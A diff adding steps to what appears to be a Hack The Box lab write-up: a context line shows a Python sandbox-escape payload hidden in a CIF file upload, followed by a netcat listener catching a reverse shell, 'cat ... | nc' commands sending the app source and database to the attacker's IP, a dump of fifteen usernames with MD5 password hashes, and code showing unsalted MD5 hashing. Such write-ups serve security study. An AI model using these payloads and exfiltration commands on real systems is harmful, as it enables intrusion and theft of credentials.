@@ -259,5 +259,100 @@ _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1]
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ------WebKitFormBoundarySae1pZqkTTUyVRUq--
+```
 
+reverse shell:
+```bash
+┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-dnumvgyfxy]─[~]
+└──╼ [★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.129.2.140] 45054
+whoami
+app
+ls -lah
+total 52K    
+drwxr-xr-x    8 app      app         4.0K Oct  9 20:18 .
+drwxr-xr-x    4 root     root        4.0K Jun 16 23:10 ..
+lrwxrwxrwx    1 root     root           9 Jun 17 01:51 .bash_history -> /dev/null
+-rw-r--r--    1 app      app          220 Jun 15 20:43 .bash_logout
+-rw-r--r--    1 app      app         3.7K Jun 15 20:43 .bashrc
+drwxrwxr-x    3 app      app         4.0K Jun 17 00:44 .cache
+drwx------    7 app      app         4.0K Jun 15 22:57 .local
+-rw-r--r--    1 app      app          807 Jun 15 20:43 .profile
+lrwxrwxrwx    1 root     root           9 Jun 17 01:52 .sqlite_history -> /dev/null
+-rw-------    1 app      app         5.7K Oct  9 20:08 app.py
+drwx------    2 app      app         4.0K Nov 15 04:18 instance
+drwx------    2 app      app         4.0K Oct  9 20:13 static
+drwx------    2 app      app         4.0K Oct  9 20:18 templates
+drwx------    2 app      app         4.0K Nov 15 04:18 uploads
+pwd
+/home/app
+
+```
+
+send app and db over with netcat for further analysis:
+```bash
+cat app.py | nc 10.10.14.34 4444
+cat instance/database.db | nc 10.10.14.34 4444
+```
+
+database content:
+```bash
+sqlite> .tables
+structure  user     
+sqlite> .schema
+CREATE TABLE structure (
+        id INTEGER NOT NULL,
+        user_id INTEGER NOT NULL,
+        filename VARCHAR(150) NOT NULL,
+        identifier VARCHAR(100) NOT NULL,
+        PRIMARY KEY (id),
+        FOREIGN KEY(user_id) REFERENCES user (id),
+        UNIQUE (identifier)
+);
+CREATE TABLE user (
+        id INTEGER NOT NULL,
+        username VARCHAR(150) NOT NULL,
+        password VARCHAR(150) NOT NULL,
+        PRIMARY KEY (id),
+        UNIQUE (username)
+);
+sqlite> SELECT * FROM user;
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+11|gelacia|4af70c80b68267012ecdac9a7e916d18
+12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+13|axel|9347f9724ca083b17e39555c36fd9007
+14|kristel|6896ba7b11a62cacffbdaded457c6d92
+15|test|098f6bcd4621d373cade4e832627b4f6
+```
+
+app content:
+```bash
+..........
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if User.query.filter_by(username=username).first():
+            flash('Username already exists.')
+            return redirect(url_for('register'))
+        hashed_password = hashlib.md5(password.encode()).hexdigest()
+        new_user = User(username=username, password=hashed_password)
+        db.session.add(new_user)
+        db.session.commit()
+        login_user(new_user)
+        return redirect(url_for('dashboard'))
+    return render_template('register.html')
+..........
 ```
